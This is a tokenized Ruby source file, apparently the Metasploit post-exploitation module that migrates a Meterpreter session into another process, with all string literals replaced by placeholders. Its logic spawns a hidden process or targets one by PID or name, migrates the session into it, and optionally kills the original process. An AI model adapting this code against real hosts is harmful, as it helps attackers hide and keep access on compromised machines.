require <str> require <str> class Metasploit3 < Msf :: Post def initialize ( info = { } ) super ( update_info ( info , <str> = > <str> , <str> = > <str> , <str> = > MSF_LICENSE , <str> = > [ <str> ] , <str> = > [ <str> ] , <str> = > [ <str> ] ) ) register_options ( [ OptBool . new ( <str> , [ false , <str> , true ] ) , OptInt . new ( <str> , [ false , <str> ] ) , OptString . new ( <str> , [ false , <str> ] ) , OptBool . new ( <str> , [ false , <str> , false ] ) ] , self . class ) end def run print_status ( <str> sysinfo [ <str> ] <str> ) server = session . sys . process . open original_pid = server . pid print_status ( <str> server . name <str> server . pid <str> ) target_pid = nil if datastore [ <str> ] print_status ( <str> ) target_pid = create_temp_proc elsif datastore [ <str> ] != <int> target_pid = datastore [ <str> ] elsif datastore [ <str> ] target_pid = session . sys . process [ datastore [ <str> ] ] end if not target_pid or not has_pid? ( target_pid ) print_error ( <str> ) return end begin print_good ( <str> target_pid <str> ) session . core . migrate ( target_pid ) print_good ( <str> target_pid <str> ) rescue :: Exception = > e print_error ( <str> ) print_error ( <str> e . class <str> e <str> ) end if datastore [ <str> ] print_status ( <str> original_pid <str> ) session . sys . process . kill ( original_pid ) print_good ( <str> original_pid <str> ) end end def create_temp_proc ( ) cmd = <str> proc = session . sys . process . execute ( cmd , nil , { <str> = > true } ) return proc . pid end end 
